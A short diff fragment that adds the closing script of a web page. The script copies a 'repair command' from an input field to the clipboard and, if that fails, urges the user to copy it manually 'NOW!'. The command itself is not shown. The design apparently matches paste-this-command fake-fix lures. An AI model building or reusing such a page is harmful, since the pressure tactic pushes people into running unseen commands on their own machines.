+        navigator.clipboard
+          .writeText(repairCommandInput.value)
+          .then(() => {
+            copyButton.textContent = "COPIED!";
+            copyButton.classList.add("copied");
+            copyButton.disabled = true;
+            setTimeout(() => {
+              copyButton.textContent = "COPY";
+              copyButton.classList.remove("copied");
+              copyButton.disabled = false;
+            }, 2000);
+          })
+          .catch((err) => {
+            // Basic fallback
+            try {
+              repairCommandInput.select();
+              document.execCommand("copy");
+              copyButton.textContent = "COPIED!";
+              copyButton.classList.add("copied");
+              copyButton.disabled = true;
+              setTimeout(() => {
+                copyButton.textContent = "COPY";
+                copyButton.classList.remove("copied");
+                copyButton.disabled = false;
+              }, 2000);
+            } catch (execErr) {
+              alert(
+                "Automatic copy failed! Select and copy the command MANUALLY - NOW!"
+              );
+            }
+          });
+      });
+    </script>
+  </body>
+</html>
